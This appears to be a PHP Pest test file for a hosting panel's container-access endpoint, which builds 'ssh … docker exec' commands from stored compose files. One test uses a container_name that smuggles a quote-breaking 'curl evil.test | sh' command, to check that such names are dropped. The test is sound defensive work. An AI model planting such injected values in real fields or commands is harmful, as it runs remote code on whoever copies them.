<?php

use App\Models\Application;
use App\Models\Permission;
use App\Models\Role;
use App\Models\ServerCapability;
use App\Models\SystemUser;
use App\Models\User;
use Database\Seeders\PermissionSeeder;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Process;

/**
 * `GET /applications/{id}/container/access` (RC-23): what the Command-line access
 * card needs to write `ssh -t <user>@<host> 'sudo docker exec -it <name> sh'`.
 *
 * The container names come out of the STORED compose file, not out of `docker ps`:
 * the card is on every Docker app's dashboard, and the panel always runs the file
 * with `-p sv-app-<id>`, so the file alone says what Compose will call each one.
 */
beforeEach(function () {
    $this->seed(PermissionSeeder::class);
    $this->admin = User::factory()->admin()->create();

    ServerCapability::query()->delete();
    ServerCapability::create([
        'stack' => 'docker', 'web_server' => 'nginx',
        'capabilities' => ['php' => true, 'node' => false, 'serving_profiles' => ['docker']],
        'source' => 'installer', 'verified_at' => now(),
    ]);

    $this->systemUser = SystemUser::create([
        'username' => 'shop', 'home_path' => '/home/shop',
        'ssh_access' => true, 'sudo' => true, 'password' => 'not-a-real-one',
    ]);

    $this->application = Application::forceCreate([
        'system_user_id' => $this->systemUser->id,
        'name' => 'Shop', 'slug' => 'shop', 'domain' => 'shop.test',
        'site_type' => 'docker', 'serving_profile' => 'docker', 'web_root' => 'public_html',
        'image' => 'nginx:1.27-alpine', 'container_port' => 80, 'app_port' => 20001,
        'status' => 'active',
    ]);

    // The box: SSH moved to 2222, a directly attached public address. Every
    // command that ran is kept so the tests can say none of them was `docker`.
    $this->ran = [];
    Process::fake(function ($process) {
        $args = $process->command;

        while (in_array($args[0] ?? '', ['sudo', '-n', 'env'], true) || str_contains($args[0] ?? '', '=')) {
            array_shift($args);
        }

        $this->ran[] = $args;

        return match ($args[0] ?? '') {
            'sshd' => Process::result(output: "port 2222\npermitrootlogin no\n"),
            'ip' => Process::result(output: "1.1.1.1 via 10.0.0.1 dev eth0 src 93.184.216.34 uid 0\n"),
            default => Process::result(exitCode: 0),
        };
    });
    Http::fake();
});

function accessHeaders(?User $user = null): array
{
    return ['Authorization' => 'Bearer '.($user ?? test()->admin)->createToken('t')->plainTextToken];
}

function accessUrl(?Application $application = null): string
{
    return '/api/applications/'.($application ?? test()->application)->id.'/container/access';
}

/** A user holding exactly these permissions, each at `view`. */
function accessViewer(array $permissions): User
{
    $role = Role::create(['name' => 'Access '.implode(' ', $permissions), 'slug' => 'access-'.implode('-', $permissions)]);

    foreach ($permissions as $permission) {
        $role->permissions()->attach(
            Permission::where('name', $permission)->sole()->id,
            ['view' => true, 'manage' => false],
        );
    }

    $user = User::factory()->create();
    $user->roles()->attach($role);

    return $user;
}

it('names every service of a recipe app, the published one first', function () {
    // As a recipe renders it: the database comes FIRST in the file and the app
    // publishes the port. The card defaults to the main container, so the order
    // is what decides which shell somebody lands in.
    $ghost = Application::forceCreate([
        'system_user_id' => $this->systemUser->id,
        'name' => 'Ghost', 'slug' => 'ghostie', 'domain' => 'ghostie.test',
        'site_type' => 'ghost', 'serving_profile' => 'docker', 'web_root' => 'public_html',
        'app_port' => 20002, 'container_port' => 2368, 'status' => 'active',
        'compose' => <<<'YAML'
            name: sv-app-99

            services:
              db:
                image: mysql:8.0
                restart: unless-stopped
              ghost:
                image: ghost:5-alpine
                ports:
                  - "127.0.0.1:20002:2368"
                depends_on:
                  - db
              cache:
                image: redis:7-alpine
            YAML,
    ]);

    $response = $this->withHeaders(accessHeaders())->getJson(accessUrl($ghost))->assertOk();

    $project = 'sv-app-'.$ghost->id;

    expect($response->json('project'))->toBe($project)
        ->and($response->json('containers'))->toBe([
            ['service' => 'ghost', 'name' => "{$project}-ghost-1", 'main' => true],
            ['service' => 'db', 'name' => "{$project}-db-1", 'main' => false],
            ['service' => 'cache', 'name' => "{$project}-cache-1", 'main' => false],
        ])
        ->and($response->json('host'))->toBe('93.184.216.34')
        ->and($response->json('ssh_port'))->toBe(2222);
});

it('uses container_name when a Container-tab file sets one', function () {
    $this->application->forceFill(['compose' => <<<'YAML'
        services:
          web:
            image: nginx:1.27-alpine
            container_name: shop-web
            ports:
              - "20001:80"
          worker:
            image: busybox
            container_name: shop-worker
        YAML])->save();

    $this->withHeaders(accessHeaders())->getJson(accessUrl())
        ->assertOk()
        ->assertJsonPath('containers', [
            ['service' => 'web', 'name' => 'shop-web', 'main' => true],
            ['service' => 'worker', 'name' => 'shop-worker', 'main' => false],
        ]);
});

it('names the one service of a Simple-mode site from the file the panel renders', function () {
    $this->withHeaders(accessHeaders())->getJson(accessUrl())
        ->assertOk()
        ->assertJsonPath('containers', [
            ['service' => 'app', 'name' => 'sv-app-'.$this->application->id.'-app-1', 'main' => true],
        ]);
});

it('finds the published service in the long port syntax too', function () {
    $this->application->forceFill(['compose' => <<<'YAML'
        services:
          sidecar:
            image: busybox
          app:
            image: nginx:1.27-alpine
            ports:
              - target: 80
                published: "20001"
                host_ip: 127.0.0.1
        YAML])->save();

    $containers = $this->withHeaders(accessHeaders())->getJson(accessUrl())->assertOk()->json('containers');

    expect($containers[0])->toMatchArray(['service' => 'app', 'main' => true])
        ->and($containers[1])->toMatchArray(['service' => 'sidecar', 'main' => false]);
});

it('drops a container_name that is not a name Docker would accept', function () {
    // These are pasted into somebody's terminal inside single quotes, under sudo.
    // A name Docker would refuse is not a running container, and one carrying a
    // quote is a command for whoever copies it.
    $this->application->forceFill(['compose' => <<<'YAML'
        services:
          app:
            image: nginx:1.27-alpine
            container_name: "x'; curl evil.test | sh; '"
            ports:
              - "127.0.0.1:20001:80"
          db:
            image: postgres:16
        YAML])->save();

    $this->withHeaders(accessHeaders())->getJson(accessUrl())
        ->assertOk()
        ->assertJsonPath('containers', [
            ['service' => 'db', 'name' => 'sv-app-'.$this->application->id.'-db-1', 'main' => false],
        ]);
});

it('never asks Docker', function () {
    $this->withHeaders(accessHeaders())->getJson(accessUrl())->assertOk();

    expect(collect($this->ran)->pluck(0)->all())->not->toContain('docker');
});

it('is refused for a site that is not a container, like the other container endpoints', function () {
    // A container type set to another profile: the controller's 422, as compose says.
    $this->application->forceFill(['serving_profile' => 'php'])->save();

    $this->withHeaders(accessHeaders())->getJson(accessUrl())->assertStatus(422);
    $this->withHeaders(accessHeaders())
        ->getJson('/api/applications/'.$this->application->id.'/container/compose')
        ->assertStatus(422);

    // A PHP site: the screen does not exist for it at all, so the middleware's 404.
    $php = Application::forceCreate([
        'system_user_id' => $this->systemUser->id,
        'name' => 'Blog', 'slug' => 'blog', 'domain' => 'blog.test',
        'site_type' => 'wordpress', 'serving_profile' => 'php', 'web_root' => 'public_html',
        'status' => 'active',
    ]);

    $this->withHeaders(accessHeaders())->getJson(accessUrl($php))->assertNotFound();
    $this->withHeaders(accessHeaders())
        ->getJson('/api/applications/'.$php->id.'/container/compose')
        ->assertNotFound();
});

it('lists no system users to a viewer without the system_user permission', function () {
    $viewer = accessViewer(['application', 'app_compose']);

    $this->withHeaders(accessHeaders($viewer))->getJson(accessUrl())
        ->assertOk()
        ->assertJsonPath('ssh_users', [])
        ->assertJsonPath('containers.0.main', true);
});

it('lists the system users and their flags, and nothing secret, to a viewer who may see them', function () {
    SystemUser::create(['username' => 'alice', 'home_path' => '/home/alice', 'ssh_access' => false, 'sudo' => false]);

    $viewer = accessViewer(['application', 'app_compose', 'system_user']);

    $response = $this->withHeaders(accessHeaders($viewer))->getJson(accessUrl())->assertOk();

    expect($response->json('ssh_users'))->toBe([
        ['username' => 'alice', 'ssh_access' => false, 'sudo' => false, 'has_password' => false],
        ['username' => 'shop', 'ssh_access' => true, 'sudo' => true, 'has_password' => true],
    ])
        ->and($response->getContent())->not->toContain('not-a-real-one')
        ->and($response->getContent())->not->toContain('home_path');
});

it('is refused without the permission that reads the compose file', function () {
    $viewer = accessViewer(['application', 'system_user']);

    $this->withHeaders(accessHeaders($viewer))->getJson(accessUrl())->assertForbidden();
});

it('reads the SSH port once and not on every page view', function () {
    $this->withHeaders(accessHeaders())->getJson(accessUrl())->assertOk();
    $this->withHeaders(accessHeaders())->getJson(accessUrl())->assertOk();

    expect(collect($this->ran)->filter(fn (array $args): bool => $args[0] === 'sshd')->count())->toBe(1);
});

it('ships its YAML parser in a production install', function () {
    // The panel is installed and updated with `composer install --no-dev`. The parser
    // was a dev dependency, so every test here passed while a live box answered 500
    // with `Class "Symfony\Component\Yaml\Yaml" not found` (found on the RC-23 check).
    $composer = json_decode((string) file_get_contents(base_path('composer.json')), true);

    expect($composer['require'])->toHaveKey('symfony/yaml')
        ->and($composer['require-dev'] ?? [])->not->toHaveKey('symfony/yaml');
});
